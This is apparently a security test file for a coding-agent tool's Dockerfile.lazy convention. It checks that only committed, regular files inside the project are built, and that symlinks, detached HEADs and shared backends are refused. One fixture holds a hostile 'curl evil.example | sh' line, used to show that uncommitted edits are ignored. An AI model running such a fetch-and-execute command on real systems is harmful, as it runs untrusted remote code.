import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { mkdtemp, writeFile, rm, realpath, symlink, mkdir, readFile } from 'fs/promises';
import { join } from 'path';
import { tmpdir } from 'os';
import {
  resolveCustomDockerfile,
  inspectConventionalDockerfile,
  describeSkippedRootDockerfile,
} from '../../src/capture/claude';
import { autoBuildsRootDockerfile, MANAGED_BACKEND_ENV, MANAGED_ENV } from '../../src/config/managed-mode';
import { MANAGED_STORAGE_ENV } from '../../src/config/managed';
import { checkRootDockerfile } from '../../src/doctor/sweep';
import { loadConfig } from '../../src/config/loader';
import { DockerRunner } from '../../src/runner/docker-runner';

// Resolution order: (adoption, upgrade latch only) → [docker].dockerfile →
// root Dockerfile.lazy when the key is unset, if TRACKED and the backend
// auto-builds → default image (null).
describe('resolveCustomDockerfile — root Dockerfile.lazy convention', () => {
  let root: string;
  const savedEnv = {
    managed: process.env[MANAGED_ENV],
    backend: process.env[MANAGED_BACKEND_ENV],
    storage: process.env[MANAGED_STORAGE_ENV],
  };
  const armManaged = (backend: string) => {
    setEnv(MANAGED_ENV, '1');
    setEnv(MANAGED_BACKEND_ENV, backend);
    setEnv(MANAGED_STORAGE_ENV, join(root, '.store'));
  };

  const git = (...args: string[]) => {
    const r = Bun.spawnSync(['git', '-c', 'user.email=t@t', '-c', 'user.name=t', ...args], { cwd: root });
    expect(r.exitCode).toBe(0);
  };
  const commit = (...files: string[]) => {
    git('add', ...files);
    git('commit', '-q', '-m', 'fixture');
  };
  const setEnv = (key: string, value: string | undefined) => {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  };

  beforeEach(async () => {
    root = await realpath(await mkdtemp(join(tmpdir(), 'lazy-conv-dockerfile-')));
    git('init', '-q');
    setEnv(MANAGED_ENV, undefined);
    setEnv(MANAGED_BACKEND_ENV, undefined);
  });
  afterEach(async () => {
    setEnv(MANAGED_ENV, savedEnv.managed);
    setEnv(MANAGED_BACKEND_ENV, savedEnv.backend);
    setEnv(MANAGED_STORAGE_ENV, savedEnv.storage);
    await rm(root, { recursive: true, force: true });
  });

  const writeConfig = (dockerfile: string) =>
    writeFile(join(root, 'lazy.toml'), `[docker]\ndockerfile = "${dockerfile}"\n`);
  const writeRootDockerfile = () => writeFile(join(root, 'Dockerfile.lazy'), 'FROM lazy-runner\n');

  test('no key and no root Dockerfile.lazy → default image', async () => {
    await writeConfig('');
    expect(await resolveCustomDockerfile(root)).toBeNull();
    expect(await describeSkippedRootDockerfile(root)).toBeNull();
  });

  test('no key and a committed root Dockerfile.lazy → a snapshot of the committed bytes', async () => {
    await writeConfig('');
    await writeRootDockerfile();
    commit('Dockerfile.lazy');
    const resolved = await resolveCustomDockerfile(root);
    expect(resolved).not.toBeNull();
    expect(resolved).not.toBe(join(root, 'Dockerfile.lazy'));
    expect(await readFile(resolved!, 'utf-8')).toBe('FROM lazy-runner\n');
  });

  // --- The working tree is never read (security review, round 2) ------------
  //
  // INVARIANT: the convention builds the bytes COMMITTED on the root's branch,
  // never the file on disk. The "committed" check and the build used to read
  // different things (git vs the working tree), which let unreviewed bytes
  // through three ways — one test each.

  test('(a) uncommitted edits to a committed Dockerfile.lazy are not built', async () => {
    await writeConfig('');
    await writeRootDockerfile();
    commit('Dockerfile.lazy');
    await writeFile(join(root, 'Dockerfile.lazy'), 'FROM lazy-runner\nRUN curl evil.example | sh\n');
    const resolved = await resolveCustomDockerfile(root);
    expect(await readFile(resolved!, 'utf-8')).toBe('FROM lazy-runner\n');
  });

  test('(b) a committed file swapped on disk for a symlink into a task worktree builds the committed bytes', async () => {
    await writeConfig('');
    await writeRootDockerfile();
    commit('Dockerfile.lazy');
    const wt = join(root, '.lazy', 'worktrees', 'agent-task');
    await mkdir(wt, { recursive: true });
    await writeFile(join(wt, 'Dockerfile.lazy'), 'FROM lazy-runner\nRUN echo agent-authored\n');
    await rm(join(root, 'Dockerfile.lazy'));
    await symlink(join(wt, 'Dockerfile.lazy'), join(root, 'Dockerfile.lazy'));
    const resolved = await resolveCustomDockerfile(root);
    expect(await readFile(resolved!, 'utf-8')).toBe('FROM lazy-runner\n');
  });

  test('(c) a task branch checked out in the root (mid-accept) is refused, never read', async () => {
    await writeConfig('');
    await writeFile(join(root, 'README.md'), 'x\n');
    commit('README.md');
    git('checkout', '-q', '-b', 'lazy/agent-task');
    await writeFile(join(root, 'Dockerfile.lazy'), 'FROM lazy-runner\nRUN echo agent-authored\n');
    commit('Dockerfile.lazy');
    await expect(resolveCustomDockerfile(root)).rejects.toThrow(/task branch lazy\/agent-task/);
  });

  test('a detached root HEAD is refused', async () => {
    await writeConfig('');
    await writeRootDockerfile();
    commit('Dockerfile.lazy');
    git('checkout', '-q', '--detach');
    await expect(resolveCustomDockerfile(root)).rejects.toThrow(/detached HEAD/);
  });

  // INVARIANT: git's failures are never read as "not committed" — a fatal
  // error must not make doctor tell someone to commit a file they committed.
  test('a git fatal error throws instead of reading as "not committed"', async () => {
    await writeConfig('');
    await writeRootDockerfile();
    commit('Dockerfile.lazy');
    await writeFile(join(root, '.git', 'HEAD'), 'garbage\n');
    await expect(inspectConventionalDockerfile(root)).rejects.toThrow(/git could not/);
  });

  // INVARIANT: only a TRACKED root Dockerfile.lazy is the image. An untracked
  // one is something nobody reviewed or accepted; it is treated exactly as if
  // absent, and the skip is described (doctor, launch narration), never silent.
  test('an untracked root Dockerfile.lazy is ignored, with a reason', async () => {
    await writeConfig('');
    await writeRootDockerfile();
    expect(await resolveCustomDockerfile(root)).toBeNull();
    expect((await inspectConventionalDockerfile(root)).kind).toBe('untracked');
    expect(await describeSkippedRootDockerfile(root)).toMatch(/not committed.*Commit it/);
  });

  // INVARIANT: "accepted" means ON THE BRANCH — staged is not committed.
  test('a root Dockerfile.lazy staged but never committed is ignored, with a reason', async () => {
    await writeConfig('');
    await writeRootDockerfile();
    git('add', 'Dockerfile.lazy');
    expect(await resolveCustomDockerfile(root)).toBeNull();
    expect(await describeSkippedRootDockerfile(root)).toMatch(/not committed/);
  });

  test('an uncommitted symlink is ignored as if absent, not a launch failure', async () => {
    await writeConfig('');
    await symlink('/etc/hostname', join(root, 'Dockerfile.lazy'));
    expect(await resolveCustomDockerfile(root)).toBeNull();
  });

  test('the key wins over a root Dockerfile.lazy', async () => {
    await writeConfig('docker/Custom.Dockerfile');
    await writeRootDockerfile();
    await mkdir(join(root, 'docker'));
    await writeFile(join(root, 'docker/Custom.Dockerfile'), 'FROM debian\n');
    expect(await resolveCustomDockerfile(root)).toBe(join(root, 'docker/Custom.Dockerfile'));
  });

  // INVARIANT: a configured Dockerfile that is missing is a loud error — the
  // convention never becomes a silent fallback for a broken key.
  test('a key naming a missing file still errors, even with a root Dockerfile.lazy', async () => {
    await writeConfig('Missing.Dockerfile');
    await writeRootDockerfile();
    await expect(resolveCustomDockerfile(root)).rejects.toThrow(/Custom Dockerfile not found: Missing\.Dockerfile/);
  });

  // INVARIANT: the convention builds only a REGULAR committed file — a symlink
  // committed as Dockerfile.lazy is refused whatever it points at.
  test('a root Dockerfile.lazy committed as a symlink is refused', async () => {
    await writeConfig('');
    await symlink('/etc/hostname', join(root, 'Dockerfile.lazy'));
    commit('Dockerfile.lazy');
    await expect(resolveCustomDockerfile(root)).rejects.toThrow(/committed as a symlink/);
  });

  // INVARIANT: a configured Dockerfile whose real path leaves the project is
  // refused, and the refusal names what it refused. The build runs on the host
  // and its output reaches launch errors, so a symlink must not read host files.
  test('a configured Dockerfile symlinked outside the project is refused, naming both paths', async () => {
    await writeConfig('Linked.Dockerfile');
    const outside = await realpath(await mkdtemp(join(tmpdir(), 'lazy-conv-outside-')));
    try {
      await writeFile(join(outside, 'secret'), 'TOKEN=abc\n');
      await symlink(join(outside, 'secret'), join(root, 'Linked.Dockerfile'));
      const err = await resolveCustomDockerfile(root).then(() => null, (e: Error) => e);
      expect(err?.message).toContain('Refusing to build from Linked.Dockerfile');
      expect(err?.message).toContain(`resolves to ${join(outside, 'secret')}`);
      expect(err?.message).toContain(`outside the project (${root})`);
    } finally {
      await rm(outside, { recursive: true, force: true });
    }
  });

  // --- Lazy Teams backends ---------------------------------------------------
  //
  // INVARIANT: on Lazy Teams' local-docker backend an accepted Dockerfile.lazy is
  // never auto-built — the build would run on the Teams host's SHARED dockerd
  // (fleet red-team: "never auto-build on accept"). The microVM backend builds on
  // the project's own guest dockerd, so the convention applies there. A managed
  // daemon told no backend fails closed. The owner's explicit key is unaffected.

  test('Teams local-docker backend: a committed root Dockerfile.lazy is not built, with a reason', async () => {
    armManaged('local-docker');
    await writeConfig('');
    await writeRootDockerfile();
    commit('Dockerfile.lazy');
    expect(await resolveCustomDockerfile(root)).toBeNull();
    expect((await inspectConventionalDockerfile(root)).kind).toBe('not-built-on-backend');
    expect(await describeSkippedRootDockerfile(root)).toMatch(/not built on this install's backend/);
  });

  test('Teams microVM backend: a committed root Dockerfile.lazy is the image', async () => {
    armManaged('microvm');
    await writeConfig('');
    await writeRootDockerfile();
    commit('Dockerfile.lazy');
    const resolved = await resolveCustomDockerfile(root);
    expect(await readFile(resolved!, 'utf-8')).toBe('FROM lazy-runner\n');
  });

  test('Teams local-docker backend: an owner-configured [docker].dockerfile is still used', async () => {
    armManaged('local-docker');
    await writeConfig('Dockerfile.lazy');
    await writeRootDockerfile();
    expect(await resolveCustomDockerfile(root)).toBe(join(root, 'Dockerfile.lazy'));
  });

  test('autoBuildsRootDockerfile: unmanaged yes; managed only on microvm; unset fails closed', () => {
    expect(autoBuildsRootDockerfile({})).toBe(true);
    expect(autoBuildsRootDockerfile({ [MANAGED_ENV]: '1', [MANAGED_BACKEND_ENV]: 'microvm' })).toBe(true);
    expect(autoBuildsRootDockerfile({ [MANAGED_ENV]: '1', [MANAGED_BACKEND_ENV]: 'local-docker' })).toBe(false);
    expect(autoBuildsRootDockerfile({ [MANAGED_ENV]: '1' })).toBe(false);
  });

  test('lazy doctor names an untracked root Dockerfile.lazy and the one-line remedy', async () => {
    await writeConfig('');
    await writeRootDockerfile();
    const result = await checkRootDockerfile(root, await loadConfig(root));
    expect(result?.warning).toMatch(/not committed/);
    expect(result?.warning).toContain('git add Dockerfile.lazy');
  });

  test('lazy doctor names the local-docker backend skip, and is silent when the file is used', async () => {
    await writeConfig('');
    await writeRootDockerfile();
    commit('Dockerfile.lazy');
    expect(await checkRootDockerfile(root, await loadConfig(root))).toBeNull();
    armManaged('local-docker');
    const result = await checkRootDockerfile(root, await loadConfig(root));
    expect(result?.warning).toMatch(/not built on this install's backend/);
  });

  // INVARIANT: on a backend that never auto-builds Dockerfile.lazy, the agent is
  // told so — the recipe's "applies to the next task" must not be promised.
  test('the agent is told when this backend does not build Dockerfile.lazy', () => {
    const runner = new DockerRunner('docker');
    expect(runner.getAgentInstructions()).not.toMatch(/not built automatically/);
    armManaged('local-docker');
    expect(runner.getAgentInstructions()).toMatch(/not built automatically/);
    armManaged('microvm');
    expect(runner.getAgentInstructions()).not.toMatch(/not built automatically/);
  });

  // INVARIANT: doctor REPORTS a refused root Dockerfile.lazy; it never dies on it.
  test('lazy doctor reports refusals (committed symlink, detached root) as failed checks', async () => {
    await writeConfig('');
    await symlink('/etc/hostname', join(root, 'Dockerfile.lazy'));
    commit('Dockerfile.lazy');
    const linked = await checkRootDockerfile(root, await loadConfig(root));
    expect(linked?.ok).toBe(false);
    expect(linked?.detail).toMatch(/committed as a symlink/);
    git('checkout', '-q', '--detach');
    const detached = await checkRootDockerfile(root, await loadConfig(root));
    expect(detached?.ok).toBe(false);
    expect(detached?.detail).toMatch(/detached HEAD/);
  });
});
